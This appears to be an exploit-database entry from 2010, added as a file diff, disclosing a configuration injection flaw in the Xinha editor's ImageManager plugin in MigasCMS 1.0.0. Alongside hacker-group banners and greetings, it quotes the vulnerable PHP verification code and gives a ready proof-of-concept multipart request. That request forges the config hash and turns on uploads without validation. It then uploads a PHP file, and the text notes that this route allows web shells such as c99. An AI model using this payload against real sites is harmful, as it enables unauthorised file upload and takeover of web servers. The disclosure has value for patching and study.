@@ -1,0 +1,148 @@
+id: 12224
+date: 05/13/2010
+title: migascms "Xinha" Plugin Configuration Injection Vulnerability
+author: eidelweiss
+cves: 
+
+=============================================================
+migascms "Xinha" Plugin Configuration Injection Vulnerability
+=============================================================
+
+1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
+0     _                   __           __       __                     1
+1   /' \            __  /'__`\        /\ \__  /'__`\                   0
+0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
+1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
+0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
+1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
+0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
+1                  \ \____/ >> Exploit database separated by exploit   0
+0                   \/___/          type (local, remote, DoS, etc.)    1
+1                                                                      1
+0  [+] Site            : Inj3ct0r.com                                  0
+1  [+] Support e-mail  : submit[at]inj3ct0r.com                        1
+0                                                                      0
+1                    ########################################          1
+0                    I'm eidelweiss member from Inj3ct0r Team          1
+1                    ########################################          0
+0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
+
+Download:	http://www.sebrac.webcindario.com/cms/index.php?mode=downloads
+Affected:		MigasCMS 1.0.0
+Author:		eidelweiss
+Contact:		eidelweiss[at]cyberservices.com
+Credits:		Stefan Esser
+Thank`s:		r0073r & 0x1D (inj3ct0r) , JosS (Hack0wn) , exploit-db team , [D]eal [C]yber
+Greetz: 		Stefan Esser, yogyacarderlink Team, devilzc0de & all INDONESIAN HACKER`s
+
+========================================================================
+
+Description:
+
+During an audit of the Xinha WYSIWYG editor it was discovered that it contains a major security hole that allows injecting arbitrary configuration into the editorâ€™s plugins.
+These plugins can usually be used from everyone without being logged into the application Xinha uses.
+By injecting an attacker defined configuration into the ImageManager plugin it is possible to upload arbitrary files to any directory on the webserver that is writable.
+Often sich allows uploading malicious PHP files (e.g. c99) into the document root directory. MigasCMS is one of application that affected with this type of vulnerablity.
+
+The vulnerability is caused by a logical error in the dynamic configuration feature of the Xinha editor.
+The editor allows PHP scripts to pass a new configuration to the plugins through the request variables.
+The configuration is secured by a salted SHA1 hash with the secret salt being stored in the user session.
+However due to a logical error in the verification an attacker can force the verification to use a secret salt known to him.
+This allows to inject arbitrary configurations
+
+========================================================================
+
+	-=[ VULN C0de ]=-
+
+The vulnerability it is necessary to take a look into the config.inc.php file of the ImageManager Plugin:
+
+	[-] path/cms/admin/xinha/plugins/ImageManager/config.inc.php
+
+************************************************************************/
+292. // Standard PHP Backend Data Passing
+293. //  if data was passed using xinha_pass_to_php_backend() we merge the items
+294. //  provided into the Config
+295. require_once(realpath(dirname(__FILE__) . '/../../contrib/php-xinha.php'));
+296. if($passed_data = xinha_read_passed_data())
+297. {
+298.   $IMConfig = array_merge($IMConfig, $passed_data);
+299.   $IMConfig['backend_url'] .= xinha_passed_data_querystring() . '&';
+300. }
+301. // Deprecated config passing, don't use this way any more!
+302. elseif(isset($_REQUEST['backend_config']))
+303. {
+304.   if(get_magic_quotes_gpc()) {
+305.     $_REQUEST['backend_config'] = stripslashes($_REQUEST['backend_config']);
+306.   }
+307.   
+308.   // Config specified from front end, check that it's valid
+309.   session_start();
+310.   $secret = $_SESSION[$_REQUEST['backend_config_secret_key_location']];
+311. 
+312.   if($_REQUEST['backend_config_hash'] !== sha1($_REQUEST['backend_config'] . $secret))
+313.   {
+314.     die("Backend security error.");
+315.  }
+316. 
+317.   $to_merge = unserialize($_REQUEST['backend_config']);
+318.   if(!is_array($to_merge))
+319.   {
+320.     die("Backend config syntax error.");
+321.   }
+322. 
+323.   $IMConfig = array_merge($IMConfig, $to_merge);
+************************************************************************/
+
+An attacker can control the name of session, which is usually PHPSESSID.
+He can control the session variable used through the backend_data[key_location] variable and he controls the data and the hash.
+The only difference here is that the choosen session variable must exist, but this is not a problem in most applications, as explained above.
+
+========================================================================
+
+	-=[ P0C exploitation ]=-
+
+************************************************************************/
+Content-Length: 735
+
+----------789665048
+Content-Disposition: form-data; name="__plugin"
+
+ImageManager
+----------789665048
+Content-Disposition: form-data; name="__function"
+
+images
+----------789665048
+Content-Disposition: form-data; name="dir"
+
+/
+----------789665048
+Content-Disposition: form-data; name="backend_config"
+
+a:4:{s:10:"images_dir";s:17:"../../../uploads/";s:12:"allow_upload";b:1;s:13:"allow_new_dir";b:1;s:15:"validate_images";b:0;}
+----------789665048
+Content-Disposition: form-data; name="backend_config_hash"
+
+7c4d33785daa5c2370201ffa236b427aa37c9996
+----------789665048
+Content-Disposition: form-data; name="backend_config_secret_key_location"
+
+exploitdummy
+----------789665048
+Content-Disposition: form-data; name="upload"; filename="xXx.php";
+Content-Type: xXx
+
+<?php phpinfo();?>
+----------789665048
+
+----------789665048
+************************************************************************/
+
+Even if the webserver does not have writable directories this vulnerability is critical because by overwriting the plugin configuration it is possible to also trigger other problems like remote URL inclusions.
+
+=========================| -=[ E0F ]=- |=================================
+
+
+
+
+#  0day.today [2023-03-24]  #
